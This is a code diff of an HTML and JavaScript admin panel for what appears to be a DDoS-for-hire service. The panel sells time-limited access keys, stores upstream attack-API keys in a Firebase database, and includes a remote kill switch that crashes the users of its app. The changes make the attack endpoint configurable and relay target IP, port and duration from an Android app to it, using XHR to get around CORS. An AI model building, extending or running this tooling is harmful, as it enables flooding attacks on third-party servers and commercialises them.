@@ -42,16 +42,16 @@
     </div>
 
     <div id="mainPanel" class="hidden">
+        <!-- API URL SECTION -->
         <div class="box">
-            <h2>🌐 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄 𝐔𝐑𝐋</h2>
-            <input type="text" id="dbUrl" placeholder="https://xxx.firebaseio.com/">
+            <h2>🌐 𝐀𝐏𝐈 𝐔𝐑𝐋 (Attack Endpoint)</h2>
+            <input type="text" id="apiUrl" placeholder="https://delvorn.vynqo.in/api/attack/start">
             <div class="btn-group">
-                <button onclick="saveDb()" class="success">𝐒𝐀𝐕𝐄</button>
-                <button onclick="updateDb()" class="warning">𝐔𝐏𝐃𝐀𝐓𝐄</button>
-                <button onclick="deleteDb()" class="danger">𝐃𝐄𝐋𝐄𝐓𝐄</button>
+                <button onclick="saveApiUrl()" class="success">𝐒𝐀𝐕𝐄 𝐔𝐑𝐋</button>
             </div>
         </div>
 
+        <!-- API KEYS SECTION -->
         <div class="box">
             <h2>🔑 𝐀𝐏𝐈 𝐊𝐄𝐘𝐒 (𝟏𝟎 𝐒𝐋𝐎𝐓𝐒)</h2>
             <div id="apiSlots">
@@ -67,18 +67,19 @@
                 <input type="text" id="apiKey10" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟏𝟎">
             </div>
             <div class="btn-group">
-                <button onclick="saveApi()" class="success">𝐒𝐀𝐕𝐄 𝐀𝐏𝐈𝐬</button>
-                <button onclick="updateApi()" class="warning">𝐔𝐏𝐃𝐀𝐓𝐄 𝐀𝐏𝐈𝐬</button>
-                <button onclick="deleteApi()" class="danger">𝐃𝐄𝐋𝐄𝐓𝐄 𝐀𝐏𝐈𝐬</button>
+                <button onclick="saveApis()" class="success">𝐒𝐀𝐕𝐄 𝐀𝐏𝐈𝐬</button>
+                <button onclick="deleteApis()" class="danger">𝐃𝐄𝐋𝐄𝐓𝐄 𝐀𝐏𝐈𝐬</button>
             </div>
         </div>
 
+        <!-- TEST API SECTION -->
         <div class="box">
             <h2>⚡ 𝐓𝐄𝐒𝐓 𝐀𝐏𝐈 𝐎𝐍𝐋𝐈𝐍𝐄</h2>
             <div id="apiTestButtons" style="margin-bottom: 10px; display: flex; flex-wrap: wrap; gap: 10px;"></div>
-            <div id="apiTestResult" style="font-size: 14px; font-weight: bold; margin-top: 10px;"></div>
+            <div id="apiTestResult" style="font-size: 14px; font-weight: bold; margin-top: 10px; white-space: pre-wrap; word-break: break-all;"></div>
         </div>
 
+        <!-- NOTIFICATION SECTION -->
         <div class="box">
             <h2>📢 𝐂𝐔𝐒𝐓𝐎𝐌 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 𝐌𝐄𝐒𝐒𝐀𝐆𝐄</h2>
             <input type="text" id="notifTitle" placeholder="𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐓𝐢𝐭𝐥𝐞" value="𝐀𝐩𝐩 𝐋𝐨𝐜𝐤𝐞𝐝 𝐁𝐲 𝐎𝐰𝐧𝐞𝐫">
@@ -86,6 +87,7 @@
             <button onclick="saveNotif()" class="success">𝐒𝐀𝐕𝐄 & 𝐔𝐏𝐃𝐀𝐓𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄</button>
         </div>
 
+        <!-- APP LOCK STATUS -->
         <div class="box">
             <h2>🛑 𝐀𝐏𝐏 𝐋𝐎𝐂𝐊 𝐒𝐓𝐀𝐓𝐔𝐒</h2>
             <div class="lock-box">
@@ -98,6 +100,7 @@
             <div style="font-size: 11px; color: #888; margin-top: 10px;">𝐓𝐮𝐫𝐧 𝐎𝐍 𝐭𝐨 𝐜𝐫𝐚𝐬𝐡 𝐚𝐥𝐥 𝐮𝐬𝐞𝐫𝐬 𝐢𝐧𝐬𝐭𝐚𝐧𝐭𝐥𝐲.</div>
         </div>
 
+        <!-- GENERATE KEY SECTION -->
         <div class="box">
             <h2>🔑 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄 𝐍𝐄𝐖 𝐊𝐄𝐘</h2>
             <input type="text" id="keyName" placeholder="𝐊𝐞𝐲 𝐍𝐚𝐦𝐞 (𝐞.𝐠. 𝐕𝐈𝐏-𝐔𝐒𝐄𝐑)">
@@ -109,6 +112,7 @@
             </div>
         </div>
 
+        <!-- ALL KEYS LIST -->
         <div class="box">
             <h2>📋 𝐀𝐋𝐋 𝐊𝐄𝐘𝐒 & 𝐃𝐄𝐓𝐀𝐈𝐋𝐒</h2>
             <button onclick="fetchKeys()" class="info">𝐑𝐄𝐅𝐑𝐄𝐒𝐇 𝐋𝐈𝐒𝐓</button>
@@ -117,8 +121,11 @@
     </div>
 
     <script>
+        // Yahan apna Firebase DB URL daalo (bina https:// ke bhi chalega, par https better hai)
+        const CLOUD_DB_URL = "https://kkhg5hh5-default-rtdb.firebaseio.com/";
+        
+        // Encryption for API Keys (Base64 + XOR)
         const SECRET_SALT = "VeilSecure2024"; 
-
         function encryptKey(key) {
             if (!key) return "";
             let result = "";
@@ -127,7 +134,6 @@
             }
             return btoa(result); 
         }
-
         function decryptKey(encryptedKey) {
             if (!encryptedKey) return "";
             try {
@@ -140,8 +146,6 @@
             } catch (e) { return ""; }
         }
 
-        const dbUrlInput = document.getElementById('dbUrl');
-        dbUrlInput.value = localStorage.getItem('dbUrl') || '';
         let generatedKeyText = "";
 
         function login() {
@@ -149,49 +153,59 @@
             if (pass === "veil") { 
                 document.getElementById('loginBox').classList.add('hidden');
                 document.getElementById('mainPanel').classList.remove('hidden');
+                loadApiUrl();
+                loadApis();
                 fetchKillStatus();
                 fetchKeys();
-                fetchApis();
                 fetchNotification();
             } else { alert("𝐖𝐫𝐨𝐧𝐠 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝"); }
         }
 
-        async function saveDb() {
-            const db = dbUrlInput.value.trim();
-            if (!db) return alert("𝐄𝐧𝐭𝐞𝐫 𝐃𝐁 𝐔𝐑𝐋");
-            if (!db.endsWith('/')) { dbUrlInput.value = db + '/'; }
-            localStorage.setItem('dbUrl', dbUrlInput.value);
-            await fetch(`${dbUrlInput.value}settings/config.json`, { method: 'PATCH', body: JSON.stringify({ db_url: dbUrlInput.value }) });
-            alert("𝐃𝐁 𝐔𝐑𝐋 𝐒𝐚𝐯𝐞𝐝 & 𝐏𝐮𝐬𝐡𝐞𝐝 𝐭𝐨 𝐂𝐥𝐨𝐮𝐝!");
+        // --- API URL LOGIC ---
+        async function loadApiUrl() {
+            try {
+                const res = await fetch(`${CLOUD_DB_URL}settings/config.json`);
+                const data = await res.json();
+                if (data && data.api_url) {
+                    document.getElementById('apiUrl').value = data.api_url;
+                } else {
+                    document.getElementById('apiUrl').value = "https://delvorn.vynqo.in/api/attack/start";
+                }
+            } catch(e) {}
         }
 
-        function updateDb() { saveDb(); alert("𝐃𝐁 𝐔𝐑𝐋 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐢𝐧 𝐂𝐥𝐨𝐮𝐝!"); }
-        function deleteDb() {
-            if(confirm("𝐃𝐞𝐥𝐞𝐭𝐞 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 𝐔𝐑𝐋?")) { localStorage.removeItem('dbUrl'); dbUrlInput.value = ""; alert("𝐃𝐁 𝐔𝐑𝐋 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 𝐋𝐨𝐜𝐚𝐥𝐥𝐲!"); }
+        async function saveApiUrl() {
+            const url = document.getElementById('apiUrl').value.trim();
+            if (!url) return alert("Enter API URL");
+            await fetch(`${CLOUD_DB_URL}settings/config.json`, { 
+                method: 'PATCH', 
+                body: JSON.stringify({ api_url: url }) 
+            });
+            alert("API URL Saved to Cloud!");
         }
 
-        async function saveApi() {
-            const db = dbUrlInput.value;
-            if (!db) return alert("𝐒𝐚𝐯𝐞 𝐃𝐁 𝐔𝐑𝐋 𝐟𝐢𝐫𝐬𝐭");
+        // --- API KEYS LOGIC ---
+        async function saveApis() {
             let updateData = {};
             for(let i=1; i<=10; i++) { 
                 const plainKey = document.getElementById(`apiKey${i}`).value.trim();
                 updateData[`api_key_${i}`] = plainKey ? encryptKey(plainKey) : "";
             }
-            await fetch(`${db}settings/config.json`, { method: 'PATCH', body: JSON.stringify(updateData) });
-            alert("𝐀𝐏𝐈𝐬 𝐄𝐧𝐜𝐫𝐲𝐩𝐭𝐞𝐝 & 𝐒𝐚𝐯𝐞𝐝 𝐭𝐨 𝐂𝐥𝐨𝐮𝐝!");
-            fetchApis();
-        }
-        function updateApi() { saveApi(); }
-        function deleteApi() {
-            if(confirm("𝐂𝐥𝐞𝐚𝐫 𝐚𝐥𝐥 𝐀𝐏𝐈 𝐊𝐞𝐲𝐬?")) { for(let i=1; i<=10; i++) { document.getElementById(`apiKey${i}`).value = ""; } saveApi(); }
+            await fetch(`${CLOUD_DB_URL}settings/config.json`, { method: 'PATCH', body: JSON.stringify(updateData) });
+            alert("APIs Encrypted & Saved to Cloud!");
+            loadApis();
         }
 
-        async function fetchApis() {
-            const db = dbUrlInput.value;
-            if (!db) return;
+        function deleteApis() {
+            if(confirm("Clear all API Keys?")) { 
+                for(let i=1; i<=10; i++) { document.getElementById(`apiKey${i}`).value = ""; } 
+                saveApis(); 
+            }
+        }
+
+        async function loadApis() {
             try {
-                const res = await fetch(`${db}settings/config.json`);
+                const res = await fetch(`${CLOUD_DB_URL}settings/config.json`);
                 const data = await res.json();
                 const testBtnContainer = document.getElementById('apiTestButtons');
                 testBtnContainer.innerHTML = "";
@@ -213,24 +227,24 @@
             } catch(e) {}
         }
 
-        // XMLHttpRequest Bypass: Sends request directly without CORS blocking
-        function sendAttackRequest(url) {
+        // --- TEST API LOGIC (Direct XMLHttpRequest Bypass) ---
+        function sendTestRequest(url) {
             return new Promise((resolve) => {
                 const xhr = new XMLHttpRequest();
                 xhr.open("GET", url, true);
                 xhr.onreadystatechange = function() {
-                    // Ready state 4 means request finished (either success or blocked)
                     if (xhr.readyState === 4) {
                         if (xhr.status === 200) {
                             resolve({ success: true, message: xhr.responseText });
+                        } else if (xhr.status === 0) {
+                            // CORS blocked but request went through
+                            resolve({ success: true, message: "Request sent (Response blocked by CORS)" });
                         } else {
-                            // CORS block or error, but request went through
-                            resolve({ success: true, message: "Request sent (CORS)" });
+                            resolve({ success: false, message: xhr.responseText || "Error Code: " + xhr.status });
                         }
                     }
                 };
                 xhr.onerror = function() {
-                    // Error means network failed
                     resolve({ success: false, message: "Network Error" });
                 };
                 xhr.send();
@@ -240,31 +254,30 @@
         async function testApi(apiKey, slotNumber) {
             const resDiv = document.getElementById('apiTestResult');
             resDiv.innerHTML = `<span style="color:#00e5ff;">𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐒𝐥𝐨𝐭 ${slotNumber}... 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭.</span>`;
-            const targetUrl = `https://delvorn.vynqo.in/api/attack/start?key=${apiKey}&ip=1.1.1.1&port=80&time=10`;
             
-            const result = await sendAttackRequest(targetUrl);
+            const baseUrl = document.getElementById('apiUrl').value.trim() || "https://delvorn.vynqo.in/api/attack/start";
+            const targetUrl = `${baseUrl}?key=${apiKey}&ip=1.1.1.1&port=80&time=10`;
+            
+            const result = await sendTestRequest(targetUrl);
             
             if (result.success) {
                 resDiv.innerHTML = `<span class="green">☑️ 𝐀𝐏𝐈 𝐓𝐄𝐒𝐓 𝐏𝐀𝐒𝐒 (𝐒𝐥𝐨𝐭 ${slotNumber} 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞)</span><br><small>${result.message}</small>`;
             } else {
-                resDiv.innerHTML = `<span class="red">❌ 𝐀𝐏𝐈 𝐓𝐄𝐒𝐓 𝐅𝐀𝐈𝐋 (𝐍𝐞𝐭𝐰𝐨𝐫𝐤 𝐄𝐫𝐫𝐨𝐫)</span>`;
+                resDiv.innerHTML = `<span class="red">❌ 𝐀𝐏𝐈 𝐓𝐄𝐒𝐓 𝐅𝐀𝐈𝐋 (𝐒𝐥𝐨𝐭 ${slotNumber})</span><br><small>${result.message}</small>`;
             }
         }
 
+        // --- NOTIFICATION LOGIC ---
         async function saveNotif() {
-            const db = dbUrlInput.value;
-            if (!db) return alert("𝐒𝐚𝐯𝐞 𝐃𝐁 𝐔𝐑𝐋 𝐟𝐢𝐫𝐬𝐭");
             const title = document.getElementById('notifTitle').value;
             const message = document.getElementById('notifMessage').value;
-            await fetch(`${db}settings/notification.json`, { method: 'PUT', body: JSON.stringify({ title: title, message: message }) });
-            alert("𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐒𝐚𝐯𝐞𝐝!");
+            await fetch(`${CLOUD_DB_URL}settings/notification.json`, { method: 'PUT', body: JSON.stringify({ title: title, message: message }) });
+            alert("Notification Message Saved!");
         }
 
         async function fetchNotification() {
-            const db = dbUrlInput.value;
-            if (!db) return;
             try {
-                const res = await fetch(`${db}settings/notification.json`);
+                const res = await fetch(`${CLOUD_DB_URL}settings/notification.json`);
                 const data = await res.json();
                 if (data) {
                     document.getElementById('notifTitle').value = data.title || "𝐀𝐩𝐩 𝐋𝐨𝐜𝐤𝐞𝐝 𝐁𝐲 𝐎𝐰𝐧𝐞𝐫";
@@ -273,19 +286,16 @@
             } catch(e) {}
         }
 
+        // --- KILL SWITCH LOGIC ---
         async function toggleKill() {
-            const db = dbUrlInput.value;
-            if (!db) return alert("𝐒𝐚𝐯𝐞 𝐃𝐁 𝐔𝐑𝐋 𝐟𝐢𝐫𝐬𝐭");
             const isChecked = document.getElementById('lockSwitch').checked;
-            await fetch(`${db}settings/app_blocked.json`, { method: 'PUT', body: JSON.stringify(isChecked) });
+            await fetch(`${CLOUD_DB_URL}settings/app_blocked.json`, { method: 'PUT', body: JSON.stringify(isChecked) });
             fetchKillStatus();
         }
 
         async function fetchKillStatus() {
-            const db = dbUrlInput.value;
-            if (!db) return;
             try {
-                const res = await fetch(`${db}settings/app_blocked.json`);
+                const res = await fetch(`${CLOUD_DB_URL}settings/app_blocked.json`);
                 const status = await res.json();
                 const statusText = document.getElementById('lockStatusText');
                 const switchBtn = document.getElementById('lockSwitch');
@@ -297,6 +307,7 @@
             } catch (e) {}
         }
 
+        // --- KEY GENERATION LOGIC ---
         function formatTime(timestamp) {
             if (!timestamp || timestamp === 0) return "𝐍/𝐀";
             const d = new Date(timestamp);
@@ -304,10 +315,9 @@
         }
 
         async function generateKey() {
-            const db = dbUrlInput.value;
             const name = document.getElementById('keyName').value;
             const expiry = document.getElementById('keyExpiry').value;
-            if (!db || !name || !expiry) return alert("𝐅𝐢𝐥𝐥 𝐚𝐥𝐥 𝐟𝐢𝐞𝐥𝐝𝐬");
+            if (!name || !expiry) return alert("Fill all fields");
 
             let timeMs = 0;
             if (expiry.endsWith('m')) timeMs = parseInt(expiry) * 60000;
@@ -315,7 +325,7 @@
             else if (expiry.endsWith('d')) timeMs = parseInt(expiry) * 86400000;
 
             const expiryTime = Date.now() + timeMs;
-            await fetch(`${db}keys/${name}.json`, { method: 'PUT', body: JSON.stringify({ expiry: expiryTime, blocked: false, firstUsed: 0 }) });
+            await fetch(`${CLOUD_DB_URL}keys/${name}.json`, { method: 'PUT', body: JSON.stringify({ expiry: expiryTime, blocked: false, firstUsed: 0 }) });
             
             generatedKeyText = `🖤 ◆ 𝐊𝐞𝐲 ➪ ${name}\n👼 ◆ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧 ➪ ${expiry}\n🍂 ◆ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐓𝐢𝐦𝐞 ➪ ${formatTime(Date.now())}\n🪼 ◆ 𝐄𝐱𝐩𝐢𝐫𝐲 𝐓𝐢𝐦𝐞 ➪ ${formatTime(expiryTime)}\n◆ 𝐍𝐨𝐭𝐞 ➪ 𝐄𝐱𝐩𝐢𝐫𝐲 𝐬𝐭𝐚𝐫𝐭𝐬 𝐰𝐡𝐞𝐧 𝐮𝐬𝐞𝐫 𝐥𝐨𝐠𝐬 𝐢𝐧 ◆`;
             
@@ -326,14 +336,12 @@
         }
 
         function copyGeneratedKey() {
-            navigator.clipboard.writeText(generatedKeyText).then(() => { alert("𝐊𝐞𝐲 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐂𝐨𝐩𝐢𝐞𝐝!"); });
+            navigator.clipboard.writeText(generatedKeyText).then(() => { alert("Key Details Copied!"); });
         }
 
         async function fetchKeys() {
-            const db = dbUrlInput.value;
-            if (!db) return;
             try {
-                const res = await fetch(`${db}keys.json`);
+                const res = await fetch(`${CLOUD_DB_URL}keys.json`);
                 const data = await res.json();
                 let html = "";
                 if (data) {
@@ -371,40 +379,33 @@
         }
 
         async function toggleBlockKey(key, blockStatus) {
-            const db = dbUrlInput.value;
-            await fetch(`${db}keys/${key}.json`, { method: 'PATCH', body: JSON.stringify({ blocked: blockStatus }) });
+            await fetch(`${CLOUD_DB_URL}keys/${key}.json`, { method: 'PATCH', body: JSON.stringify({ blocked: blockStatus }) });
             fetchKeys();
         }
 
         async function deleteKey(key) {
-            const db = dbUrlInput.value;
-            if (confirm("𝐃𝐞𝐥𝐞𝐭𝐞 𝐭𝐡𝐢𝐬 𝐤𝐞𝐲 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲?")) {
-                await fetch(`${db}keys/${key}.json`, { method: 'DELETE' });
+            if (confirm("Delete this key permanently?")) {
+                await fetch(`${CLOUD_DB_URL}keys/${key}.json`, { method: 'DELETE' });
                 fetchKeys();
             }
         }
 
-        // ==========================================
-        // APP SE ATTACK LOGIC (XHR Direct Send)
-        // ==========================================
+        // --- APP COMMUNICATION LOGIC (Receives attack request from App) ---
         window.addEventListener("message", async function(event) {
             if (event.data && event.data.action === "ATTACK") {
                 const { ip, port, duration } = event.data;
-                const db = dbUrlInput.value;
                 
-                if(!db) {
-                    Android.onAttackResponse("ERROR", "Database URL not set in Panel");
-                    return;
-                }
-
                 try {
-                    const res = await fetch(`${db}settings/config.json`);
-                    const data = await res.json();
+                    // 1. Get API URL
+                    const configRes = await fetch(`${CLOUD_DB_URL}settings/config.json`);
+                    const configData = await configRes.json();
+                    const baseUrl = configData.api_url || "https://delvorn.vynqo.in/api/attack/start";
                     
+                    // 2. Get first valid API Key
                     let apiKey = "";
-                    if (data) {
+                    if (configData) {
                         for(let i=1; i<=10; i++) {
-                            const encryptedVal = data[`api_key_${i}`];
+                            const encryptedVal = configData[`api_key_${i}`];
                             if(encryptedVal && encryptedVal.trim() !== "") {
                                 apiKey = decryptKey(encryptedVal);
                                 if(apiKey) break;
@@ -417,16 +418,14 @@
                         return;
                     }
 
-                    const targetUrl = `https://delvorn.vynqo.in/api/attack/start?key=${apiKey}&ip=${ip}&port=${port}&time=${duration}`;
-                    
-                    // Direct XHR Send
-                    const result = await sendAttackRequest(targetUrl);
+                    // 3. Send Attack via XMLHttpRequest
+                    const targetUrl = `${baseUrl}?key=${apiKey}&ip=${ip}&port=${port}&time=${duration}`;
+                    const result = await sendTestRequest(targetUrl);
                     
                     if (result.success) {
-                        // Request went through, assume success
                         Android.onAttackResponse("SUCCESS", "Attack Launched!");
                     } else {
-                        Android.onAttackResponse("ERROR", "Network Error");
+                        Android.onAttackResponse("ERROR", "API Failed: " + result.message);
                     }
 
                 } catch(e) {
